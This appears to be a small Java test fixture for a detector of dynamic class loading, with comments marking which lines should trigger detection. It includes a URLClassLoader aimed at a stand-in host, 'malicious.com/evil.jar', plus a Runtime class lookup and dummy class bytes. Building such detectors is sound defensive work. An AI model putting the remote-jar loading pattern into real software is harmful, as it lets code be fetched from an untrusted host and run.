import java.net.URL;
import java.net.URLClassLoader;

public class DynamicTest {
    public static void main(String[] args) throws Exception {
        System.out.println("Starting dynamic classloader test...");
        
        // This should trigger our dynamic detection
        Class.forName("java.lang.Runtime");
        
        // This should also trigger detection
        ClassLoader loader = new URLClassLoader(new URL[]{new URL("http://malicious.com/evil.jar")});
        
        // This should trigger defineClass detection
        String className = "EvilClass";
        byte[] classBytes = new byte[]{0x01, 0x02, 0x03}; // Dummy bytes
        
        System.out.println("Dynamic test completed.");
    }
}
